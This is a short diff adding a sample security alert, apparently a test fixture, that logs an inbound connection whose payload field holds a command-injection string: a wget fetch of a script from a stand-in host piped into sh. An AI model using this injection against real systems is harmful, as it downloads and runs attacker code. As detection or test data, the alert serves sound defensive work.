@@ -1,0 +1,4 @@
+[ALERT] INBOUND TCP CONNECTION
+IP: 198.51.100.23
+PAYLOAD: "; wget http://malicious.example/payload.sh -O- | sh;"
+USER_AGENT: 'Mozilla/5.0 (X11; Linux x86_64)'
